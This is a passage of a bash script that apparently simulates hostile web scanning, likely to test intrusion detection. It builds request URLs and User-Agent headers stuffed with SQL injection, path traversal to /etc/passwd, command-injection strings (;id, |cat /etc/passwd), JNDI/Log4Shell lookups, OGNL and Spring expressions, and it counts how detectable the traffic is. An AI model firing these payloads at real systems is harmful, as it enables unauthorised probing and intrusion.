                6) printf '%s' 'select pg_sleep(6)' ;;
                7) printf '%s' "waitfor delay '0:0:5'" ;;
                8) printf '%s' "waitfor delay '0:0:9'" ;;
            esac
            ;;
        1)
            case $((RANDOM % 6)) in
                0) printf '%s' '%00%0d%0a' ;;
                1) printf '%s' '%00%0a' ;;
                2) printf '%s' '%0d%0a' ;;
                3) printf '%s' '../../../../etc/passwd' ;;
                4) printf '%s' '..%2f..%2f..%2f' ;;
                5) printf '%s' '%252e%252e%252f' ;;
            esac
            ;;
        2)
            case $((RANDOM % 4)) in
                0) printf '%s' ';id' ;;
                1) printf '%s' ';whoami' ;;
                2) printf '%s' '&&hostname' ;;
                3) printf '%s' '|cat /etc/passwd' ;;
            esac
            ;;
        3)
            case $((RANDOM % 4)) in
                0) printf '%s' '12345\"\"\"};]*' ;;
                1) printf '%s' '@@@@@@@' ;;
                2) printf '%s' '%%%%%%%' ;;
                3) printf '%s' '<<<<>>>>' ;;
            esac
            ;;
    esac
}

http_ua_pick_rare_scanner_local() {
    case $((RANDOM % 12)) in
        0) printf '%s' 'TelemetryCollector/9.7' ;;
        1) printf '%s' 'ReconEngine/5.4' ;;
        2) printf '%s' 'SecurityAssessmentClient/3.1' ;;
        3) printf '%s' 'ThreatHunterAgent/8.2' ;;
        4) printf '%s' 'InternalAuditScanner/4.0' ;;
        5) printf '%s' 'DiscoveryProbe/7.3' ;;
        6) printf '%s' 'VulnerabilitySweep/2.6' ;;
        7) printf '%s' 'WebEnumerationFramework/11.0' ;;
        8) printf '%s' 'AssetProfiler/6.5' ;;
        9) printf '%s' 'NetworkSurveyBot/3.9' ;;
        10) printf '%s' 'Mozilla/5.0 ReconEngine/5.4' ;;
        11) printf '%s' 'Mozilla/5.0 ThreatHunterAgent/8.2' ;;
    esac
}

http_ua_pick_normal_local() {
    if (( RANDOM % 2 == 0 )); then
        printf '%s' 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    else
        printf '%s' 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
    fi
}

http_ua_pick_local() {
    local roll=$((RANDOM % 100)) pref payload
    if (( roll < 10 )); then
        http_ua_pick_normal_local
        return 0
    fi
    if (( roll < 50 )); then
        http_ua_pick_rare_scanner_local
        return 0
    fi
    if (( RANDOM % 2 == 0 )); then
        pref=$(http_ua_pick_rare_scanner_local)
        payload=$(http_ua_pick_payload_fragment_local)
        printf '%s %s' "${pref}" "${payload}"
    else
        http_ua_pick_payload_fragment_local
    fi
}

http_ua_is_normal_local() {
    local ua="$1"
    [[ "${ua}" == *"Chrome/120.0.0.0"* || "${ua}" == *"Version/17.0 Safari"* ]]
}

http_ua_classify_local() {
    local ua="$1"
    if http_ua_is_normal_local "${ua}"; then
        printf 'normal'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
        printf 'payload_sqli'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd|%%%%|@@@@|<<<<|\|\|\|\|'; then
        printf 'payload_enc'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
        printf 'payload_cmd'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '12345\\"\\"\\"\};|@@@@@@@|%%%%%%%|<<<<>>>>'; then
        printf 'payload_other'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
        printf 'rare'
        return 0
    fi
    printf 'payload_other'
}

http_ua_has_attack_pattern_local() {
    local ua="$1"
    http_ua_is_normal_local "${ua}" && return 1
    if printf '%s' "${ua}" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd'; then
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
        return 0
    fi
    return 1
}

http_ua_apply_classification_counts() {
    local kind="$1"
    case "${kind}" in
        normal) NORMAL_USER_AGENT_COUNT=$((NORMAL_USER_AGENT_COUNT + 1)) ;;
        rare)
            RARE_USER_AGENT_COUNT=$((RARE_USER_AGENT_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_sqli)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_SQLI_STYLE_COUNT=$((UA_SQLI_STYLE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_enc)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_ENCODING_ABUSE_COUNT=$((UA_ENCODING_ABUSE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_cmd)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_COMMAND_STYLE_COUNT=$((UA_COMMAND_STYLE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_other)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
    esac
}

http_url_classify_local() {
    local url="$1"
    case "${url}" in
        /|/favicon.ico) printf 'normal'; return 0 ;;
    esac
    if printf '%s' "${url}" | grep -qiE 'WEB-INF/web\.xml|\.\./\.\./etc/passwd|cmd\.jsp|backdoor\.jsp|/admin|swagger|graphql|etc/passwd'; then
        printf 'payload_url'
        return 0
    fi
    printf 'payload_url'
}

http_ua_kind_for_attack_local() {
    local ua="$1"
    if http_ua_is_normal_local "${ua}"; then
        printf 'normal'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
        printf 'rare'
        return 0
    fi
    printf 'payload'
}

reset_http_attack_metrics() {
    HTTP_ATTACK_TOTAL_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_URL_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_UA_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA=0
    HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA=0
    HTTP_UA_COVERAGE_TOTAL=0
    HTTP_UA_COVERAGE_PRESENT=0
    HTTP_UA_COVERAGE_MISSING=0
    HTTP_UA_COVERAGE_PERCENT=0
    HTTP_UA_COVERAGE_NORMAL=0
    HTTP_UA_COVERAGE_RARE=0
    HTTP_UA_COVERAGE_PAYLOAD=0
    HTTP_UA_COVERAGE_ABNORMAL=0
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
}

log_http_ua_policy_local() {
    local scope="${1:-url_scan}" msg
    msg="HTTP_UA_POLICY scope=${scope} normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
    state_append "http_attack_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

merge_http_ua_coverage_line() {
    local line="$1"
    local ct cp cm cn cr cpl cab cpct det
    ct=$(safe_int "$(sed -n 's/.*total_requests=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    [[ "${ct}" -eq 0 ]] && ct=$(safe_int "$(sed -n 's/.*total_http=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cp=$(safe_int "$(sed -n 's/.*ua_present=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cm=$(safe_int "$(sed -n 's/.*ua_missing=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cn=$(safe_int "$(sed -n 's/.*normal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cr=$(safe_int "$(sed -n 's/.*rare_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cpl=$(safe_int "$(sed -n 's/.*payload_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cab=$(safe_int "$(sed -n 's/.*abnormal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cpct=$(safe_int "$(sed -n 's/.*coverage_percent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    det=$(sed -n 's/.*detection_likelihood_malicious_ua=\([a-z]*\).*/\1/p' <<< "${line}")
    [[ -z "${det}" ]] && det=$(sed -n 's/.*detection_likelihood=\([a-z]*\).*/\1/p' <<< "${line}")
    HTTP_UA_COVERAGE_TOTAL=$((HTTP_UA_COVERAGE_TOTAL + ct))
    HTTP_UA_COVERAGE_PRESENT=$((HTTP_UA_COVERAGE_PRESENT + cp))
    HTTP_UA_COVERAGE_MISSING=$((HTTP_UA_COVERAGE_MISSING + cm))
    HTTP_UA_COVERAGE_NORMAL=$((HTTP_UA_COVERAGE_NORMAL + cn))
    HTTP_UA_COVERAGE_RARE=$((HTTP_UA_COVERAGE_RARE + cr))
    HTTP_UA_COVERAGE_PAYLOAD=$((HTTP_UA_COVERAGE_PAYLOAD + cpl))
    HTTP_UA_COVERAGE_ABNORMAL=$((HTTP_UA_COVERAGE_ABNORMAL + cab))
    if (( HTTP_UA_COVERAGE_TOTAL > 0 )); then
        HTTP_UA_COVERAGE_PERCENT=$((HTTP_UA_COVERAGE_PRESENT * 100 / HTTP_UA_COVERAGE_TOTAL))
    fi
    (( cpct > 0 )) && HTTP_UA_COVERAGE_PERCENT="${cpct}"
    [[ "${det}" == high ]] && DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
}

ingest_http_attack_remote_output() {
    local out="$1" host="$2" line
    [[ -z "${out}" ]] && return 0
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        case "${line}" in
            HTTP_UA_POLICY\ *)
                state_append "http_attack_summary.log" "${line}"
                log_message "OK" "${line}" >&2
                ;;
            HTTP_ATTACK_REQUEST\ *)
                state_append "http_attack_requests.log" "${line}"
                ;;
            HTTP_UA_COVERAGE\ *)
                merge_http_ua_coverage_line "${line}"
                state_append "http_attack_summary.log" "host=${host} ${line}"
                log_message "OK" "${line}" >&2
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r')"
}

compute_http_malicious_ua_detection_likelihood() {
    local attack_ua=$((HTTP_UA_COVERAGE_RARE + HTTP_UA_COVERAGE_PAYLOAD))
    if (( HTTP_UA_COVERAGE_TOTAL >= 40 \
        && HTTP_UA_COVERAGE_PRESENT == HTTP_UA_COVERAGE_TOTAL \
        && HTTP_UA_COVERAGE_NORMAL == 0 \
        && HTTP_UA_COVERAGE_ABNORMAL >= 40 \
        && attack_ua >= 40 )); then
        DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
        return 0
    fi
    if (( HTTP_UA_COVERAGE_TOTAL >= 20 && HTTP_UA_COVERAGE_ABNORMAL >= 20 )); then
        DETECTION_LIKELIHOOD_MALICIOUS_UA="medium"
        return 0
    fi
    DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
}

compute_http_ua_detection_likelihoods() {
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    compute_http_malicious_ua_detection_likelihood
}

log_http_ua_coverage_aggregate() {
    local det="${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}" url_det="${DETECTION_LIKELIHOOD_URL_SCAN:-low}" msg=""
    compute_http_malicious_ua_detection_likelihood
    det="${DETECTION_LIKELIHOOD_MALICIOUS_UA}"
    (( HTTP_UA_COVERAGE_TOTAL < 1 )) && return 0
    msg="HTTP_UA_COVERAGE scope=url_scan total_requests=${HTTP_UA_COVERAGE_TOTAL} ua_present=${HTTP_UA_COVERAGE_PRESENT} ua_missing=${HTTP_UA_COVERAGE_MISSING} normal_ua=${HTTP_UA_COVERAGE_NORMAL} rare_ua=${HTTP_UA_COVERAGE_RARE} payload_ua=${HTTP_UA_COVERAGE_PAYLOAD} abnormal_ua=${HTTP_UA_COVERAGE_ABNORMAL} coverage_percent=${HTTP_UA_COVERAGE_PERCENT} detection_likelihood=${det} detection_likelihood_malicious_ua=${det} detection_likelihood_url_scan=${url_det}"
    state_append "http_attack_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

check_http_ua_coverage_warn() {
    if (( HTTP_UA_COVERAGE_TOTAL < 1 )); then
        return 0
    fi
    if (( HTTP_UA_COVERAGE_PERCENT < 90 )); then
        log_message "WARN" "HTTP_UA_COVERAGE below 90%: scope=url_scan total_requests=${HTTP_UA_COVERAGE_TOTAL} ua_present=${HTTP_UA_COVERAGE_PRESENT} ua_missing=${HTTP_UA_COVERAGE_MISSING} coverage_percent=${HTTP_UA_COVERAGE_PERCENT}"
        add_fallback_usage "HTTP UA coverage ${HTTP_UA_COVERAGE_PERCENT}% < 90% (missing User-Agent on url_scan requests)"
    fi
    if (( HTTP_UA_COVERAGE_NORMAL > 0 )); then
        log_message "WARN" "HTTP_UA_COVERAGE: normal_ua=${HTTP_UA_COVERAGE_NORMAL} on url_scan scope (policy requires 0)"
        add_fallback_usage "url_scan emitted ${HTTP_UA_COVERAGE_NORMAL} normal browser User-Agent(s)"
    fi
}

format_http_attack_summary_block() {
    cat <<EOF
HTTP UA Policy (url_scan scope — no normal browser UA)
- Policy                         : normal_ua_allowed=no rare_ratio=50% payload_ratio=50% ua_required=yes
- Total requests                 : ${HTTP_UA_COVERAGE_TOTAL:-0}
- UA present / missing           : ${HTTP_UA_COVERAGE_PRESENT:-0} / ${HTTP_UA_COVERAGE_MISSING:-0}
- Coverage percent               : ${HTTP_UA_COVERAGE_PERCENT:-0}%
- normal / rare / payload UA     : ${HTTP_UA_COVERAGE_NORMAL:-0} / ${HTTP_UA_COVERAGE_RARE:-0} / ${HTTP_UA_COVERAGE_PAYLOAD:-0}
- abnormal UA (rare+payload)     : ${HTTP_UA_COVERAGE_ABNORMAL:-0}
- detection_likelihood_url_scan  : ${DETECTION_LIKELIHOOD_URL_SCAN:-low}
- detection_likelihood_malicious_ua : ${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}
- HIGH malicious UA              : total>=40 ua_present=total normal=0 abnormal>=40 rare+payload>=40
EOF
}

simulate_http_attack_metrics() {
    local planned="$1"
    planned=$(safe_int "${planned}")
    (( planned < 1 )) && planned="${HTTP_SCAN_UNIQUE_URL_TARGET:-50}"
    HTTP_UA_COVERAGE_TOTAL="${planned}"
    HTTP_UA_COVERAGE_PRESENT="${planned}"
    HTTP_UA_COVERAGE_MISSING=0
    HTTP_UA_COVERAGE_NORMAL=0
    HTTP_UA_COVERAGE_RARE=$((planned / 2))
    HTTP_UA_COVERAGE_PAYLOAD=$((planned - HTTP_UA_COVERAGE_RARE))
    HTTP_UA_COVERAGE_ABNORMAL="${planned}"
    HTTP_UA_COVERAGE_PERCENT=100
    DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
    HTTP_ATTACK_TOTAL_REQUESTS="${planned}"
    HTTP_ATTACK_PAYLOAD_URL_REQUESTS="${planned}"
    HTTP_ATTACK_PAYLOAD_UA_REQUESTS="${planned}"
}

http_url_scan_ua_policy_remote_snippet() {
    cat <<'UAPOLICY'
pick_payload_ua(){
  if [[ $((RANDOM%2)) -eq 0 ]]; then
    pref=$(pick_rare); payload=$(pick_payload); printf '%s %s' "${pref}" "${payload}"
  else
    pick_payload
  fi
}
pick_burst_ua(){
  if [[ $((RANDOM%2)) -eq 0 ]]; then pick_rare; else pick_payload_ua; fi
}
ensure_ua_nonempty(){
  local ua="$1"
  [[ -n "${ua}" ]] && { printf '%s' "${ua}"; return; }
  pick_burst_ua
}
classify_ua_kind(){
  local ua="$1"
  if is_normal_ua "${ua}"; then echo normal; return; fi
  if echo "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then echo rare; return; fi
  echo payload
}
log_http_ua_request(){
  local path="$1" ua="$2" code="${3:-}" uak uapresent safe_path safe_ua
  ua=$(ensure_ua_nonempty "${ua}")
  uak=$(classify_ua_kind "${ua}")
  uapresent=no
  [[ -n "${ua}" ]] && uapresent=yes
  ua_cov_total=$((ua_cov_total+1))
  if [[ "${uapresent}" == yes ]]; then
    ua_cov_present=$((ua_cov_present+1))
    case "${uak}" in
      normal) ua_cov_normal=$((ua_cov_normal+1));;
      rare) ua_cov_rare=$((ua_cov_rare+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
      payload) ua_cov_payload=$((ua_cov_payload+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
    esac
  else
    ua_cov_missing=$((ua_cov_missing+1))
    ua=$(pick_burst_ua)
    uak=$(classify_ua_kind "${ua}")
    uapresent=yes
    ua_cov_present=$((ua_cov_present+1))
    ua_cov_payload=$((ua_cov_payload+1))
    ua_cov_abnormal=$((ua_cov_abnormal+1))
  fi
  safe_path=$(printf '%s' "${path}" | tr '\r\n' ' ' | head -c 400)
  safe_ua=$(printf '%s' "${ua}" | tr '\r\n' ' ' | head -c 400)
  echo "HTTP_ATTACK_REQUEST target=${SCAN_TARGET} path=${safe_path} status_code=${code:-} user_agent=${safe_ua} ua_class=${uak} ua_present=${uapresent}"
}
emit_http_ua_coverage(){
  local pct=0 mal=low
  (( ua_cov_total > 0 )) && pct=$((ua_cov_present * 100 / ua_cov_total))
  if (( ua_cov_total >= 40 && ua_cov_present == ua_cov_total && ua_cov_normal == 0 && ua_cov_abnormal >= 40 && (ua_cov_rare + ua_cov_payload) >= 40 )); then
    mal=high
  elif (( ua_cov_total >= 20 && ua_cov_abnormal >= 20 )); then
    mal=medium
  fi
  echo "HTTP_UA_COVERAGE scope=url_scan total_requests=${ua_cov_total} ua_present=${ua_cov_present} ua_missing=${ua_cov_missing} normal_ua=${ua_cov_normal} rare_ua=${ua_cov_rare} payload_ua=${ua_cov_payload} abnormal_ua=${ua_cov_abnormal} coverage_percent=${pct} detection_likelihood=${mal} detection_likelihood_malicious_ua=${mal}"
}
mandatory_payload_urls=(
  '/WEB-INF/web.xml' '/../../etc/passwd' '/cmd.jsp' '/backdoor.jsp' '/admin' '/swagger' '/graphql'
)
mandatory_n=${#mandatory_payload_urls[@]}
payload_recon_urls=(
  '/WEB-INF/web.xml' '/WEB-INF/classes/' '/.env' '/backup.zip' '/admin/login' '/actuator/env'
  '/cmd.jsp' '/backdoor.jsp' '/swagger' '/swagger-ui.html' '/graphql' '/graphql/console' '/shell.jsp'
  '/../../etc/passwd' '/conf/server.xml'
)
payload_recon_n=${#payload_recon_urls[@]}
mandatory_idx=0
payload_idx=0
pick_bad_query_attack(){
  case $((RANDOM%8)) in
    0) printf '?file=../../../../WEB-INF/web.xml' ;;
    1) printf '?path=..%%2f..%%2f..%%2fetc%%2fpasswd' ;;
    2) printf '?id=%%00%%00%%00' ;;
    3) printf '?action=../../../../secret/config' ;;
    4) printf '?cmd=|whoami&file=../../../../WEB-INF/classes/' ;;
    5) printf '?%%00=1&page=admin' ;;
    6) printf '?file=%%2e%%2e%%2f%%2e%%2e%%2fweb.xml' ;;
    7) printf '?id=%25%25%25invalid%25%25%25' ;;
  esac
}
next_attack_url(){
  local base q
  if [[ ${mandatory_idx} -lt ${mandatory_n} ]]; then
    base="${mandatory_payload_urls[${mandatory_idx}]}"
    mandatory_idx=$((mandatory_idx+1))
    q=$(pick_bad_query_attack)
    printf '%s%s' "${base}" "${q}"
    return
  fi
  base="${payload_recon_urls[$((payload_idx % payload_recon_n))]}"
  payload_idx=$((payload_idx+1))
  q=$(pick_bad_query_attack)
  printf '%s%s' "${base}" "${q}"
}
UAPOLICY
}

http_attack_pairing_remote_snippet() {
    http_url_scan_ua_policy_remote_snippet
}

http_ua_remote_bash_snippet() {
    cat <<'UAEOF'
normal_uas='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
rare_uas='TelemetryCollector/9.7
ReconEngine/5.4
SecurityAssessmentClient/3.1
ThreatHunterAgent/8.2
InternalAuditScanner/4.0
DiscoveryProbe/7.3
VulnerabilitySweep/2.6
WebEnumerationFramework/11.0
AssetProfiler/6.5
NetworkSurveyBot/3.9
Mozilla/5.0 ReconEngine/5.4
Mozilla/5.0 ThreatHunterAgent/8.2'
pick_sqli(){
  case $((RANDOM%9)) in
    0) echo "' OR 1=1--" ;;
    1) echo '" OR 1=1--' ;;
    2) echo "1' OR '1'='1" ;;
    3) echo '1 OR 2+701-701-1=0+0+0+1' ;;
    4) echo '(select convert(int,char(65)))' ;;
    5) echo 'select pg_sleep(3)' ;;
    6) echo 'select pg_sleep(6)' ;;
    7) echo "waitfor delay '0:0:5'" ;;
    8) echo "waitfor delay '0:0:9'" ;;
  esac
}
pick_enc(){
  case $((RANDOM%6)) in
    0) echo '%00%0d%0a' ;;
    1) echo '%00%0a' ;;
    2) echo '%0d%0a' ;;
    3) echo '../../../../etc/passwd' ;;
    4) echo '..%2f..%2f..%2f' ;;
    5) echo '%252e%252e%252f' ;;
  esac
}
pick_cmd(){
  case $((RANDOM%4)) in
    0) echo ';id' ;;
    1) echo ';whoami' ;;
    2) echo '&&hostname' ;;
    3) echo '|cat /etc/passwd' ;;
  esac
}
pick_corrupt(){
  case $((RANDOM%4)) in
    0) echo '12345\"\"\"};]*' ;;
    1) echo '@@@@@@@' ;;
    2) echo '%%%%%%%' ;;
    3) echo '<<<<>>>>' ;;
  esac
}
pick_jndi(){
  case $((RANDOM%3)) in
    0) echo '${jndi:ldap://127.0.0.1/a}' ;;
    1) echo '${jndi:rmi://127.0.0.1/exploit}' ;;
    2) echo '${jndi:dns://127.0.0.1/x}' ;;
  esac
}
pick_ognl(){
  case $((RANDOM%2)) in
    0) echo '%{#context[com.opensymphony.xwork2]' ;;
    1) echo '@java.lang.Runtime@getRuntime()' ;;
  esac
}
pick_spring(){
  case $((RANDOM%2)) in
    0) echo 'spring.cloud.function.routing-expression' ;;
    1) echo 'T(org.springframework.web.server)' ;;
  esac
}
pick_payload(){
  case $((RANDOM%8)) in
    0) pick_sqli ;;
    1) pick_enc ;;
    2) pick_cmd ;;
    3) pick_corrupt ;;
    4) pick_jndi ;;
    5) pick_ognl ;;
    6) pick_spring ;;
    7) pick_enc ;;
  esac
}
pick_rare(){ echo "$rare_uas" | sed -n "$((1+RANDOM%12))p"; }
pick_normal(){ echo "$normal_uas" | sed -n "$((1+RANDOM%2))p"; }
pick_ua(){
  local roll=$((RANDOM%100)) pref payload
  if [[ $roll -lt 10 ]]; then pick_normal; return; fi
  if [[ $roll -lt 50 ]]; then pick_rare; return; fi
  if [[ $((RANDOM%2)) -eq 0 ]]; then
    pref=$(pick_rare); payload=$(pick_payload); echo "${pref} ${payload}"
  else
    pick_payload
  fi
}
is_normal_ua(){ echo "$normal_uas" | grep -Fq "$1"; }
track_ua(){
  local ua="$1"
  if is_normal_ua "$ua"; then nu=$((nu+1)); return; fi
  au=$((au+1))
  if echo "$ua" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
    pu=$((pu+1)); sq=$((sq+1)); return
  fi
  if echo "$ua" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd|%%%%|@@@@|<<<<'; then
    pu=$((pu+1)); enc=$((enc+1)); return
  fi
  if echo "$ua" | grep -qE '\.\./|\.\.%2f|/etc/passwd'; then
    pu=$((pu+1)); trav=$((trav+1)); return
  fi
  if echo "$ua" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
    pu=$((pu+1)); cmd=$((cmd+1)); return
  fi
  if echo "$ua" | grep -qiE 'jndi:ldap|jndi:rmi|jndi:dns|\$\{jndi:'; then
    pu=$((pu+1)); jndi=$((jndi+1)); return
  fi
  if echo "$ua" | grep -qiE 'ognl|opensymphony|Runtime@getRuntime'; then
    pu=$((pu+1)); ognl=$((ognl+1)); return
  fi
  if echo "$ua" | grep -qiE 'spring\.cloud|org\.springframework'; then
    pu=$((pu+1)); spring=$((spring+1)); return
  fi
  if echo "$ua" | grep -qE '12345\\"\\"\\"\};|@@@@@@@|%%%%%%%|<<<<>>>>'; then
    pu=$((pu+1)); return
  fi
  if echo "$ua" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
    ru=$((ru+1)); return
  fi
  pu=$((pu+1))
}
UAEOF
}

print_http_ua_dry_run_sample_line() {
    local idx="$1" ua="$2"
    log_message "OK" "  UA sample ${idx}: ${ua}"
    state_append "http_ua_dry_run_samples.log" "sample=${idx} kind=$(http_ua_classify_local "${ua}") ua=${ua}"
}

print_http_ua_dry_run_samples() {
    [[ "${DRY_RUN}" != true ]] && return 0
    [[ -n "${HTTP_UA_DRY_RUN_SAMPLES_DONE:-}" ]] && return 0
    HTTP_UA_DRY_RUN_SAMPLES_DONE=1
    local i ua attack_hits=0 pref
    log_message "OK" "HTTP User-Agent dry-run samples (20 — 10% normal / 40% rare / 50% payload):"
    i=1
    print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_normal_local)"; i=$((i + 1))
    print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_normal_local)"; i=$((i + 1))
    while (( i <= 10 )); do
        print_http_ua_dry_run_sample_line "${i}" "$(http_ua_pick_rare_scanner_local)"
        i=$((i + 1))
    done
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} select pg_sleep(6)"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua="waitfor delay '0:0:9'"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ' OR 1=1--"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='1 OR 2+701-701-1=0+0+0+1'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ../../../../etc/passwd"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='..%2f..%2f..%2f'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} %00%0d%0a"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='%252e%252e%252f'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    pref=$(http_ua_pick_rare_scanner_local)
    ua="${pref} ;id"
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"; i=$((i + 1))
    ua='|cat /etc/passwd'
    http_ua_has_attack_pattern_local "${ua}" && attack_hits=$((attack_hits + 1))
    print_http_ua_dry_run_sample_line "${i}" "${ua}"
    if (( attack_hits < 10 )); then
        log_message "WARN" "HTTP UA dry-run samples: only ${attack_hits}/20 attack-pattern UAs (expected >=10)"
    else
        log_message "OK" "HTTP UA dry-run samples: ${attack_hits}/20 contain SQLi/encoding/traversal/command patterns"
    fi
}

sanitize_stats_ints() {
    local name
    for name in "$@"; do
        printf -v "${name}" '%s' "$(safe_int "${!name}")"
    done
}

parse_http_burst_stats_line() {
    local out="$1" line scheme="http"
    local attempted=0 responses=0 connected=0 abnormal_ua=0 rare_ua=0 threat_hunt=0
    local normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0
    local http_scan_count_failed=0 http_scan_count_success=0 http_scan_count_200=0 http_scan_count_301=0 http_scan_count_302=0 http_scan_count_401=0 http_scan_count_400=0 http_scan_count_403=0 http_scan_count_404=0 http_scan_count_405=0
    local http_scan_count_500=0 http_scan_real_failed=0 http_scan_synthetic_failed=0 http_scan_redirect_count=0 http_scan_timeout_count=0
    local propfind=0 options=0 post=0
    local unique_attempted=0 unique_failed=0 unique_success=0
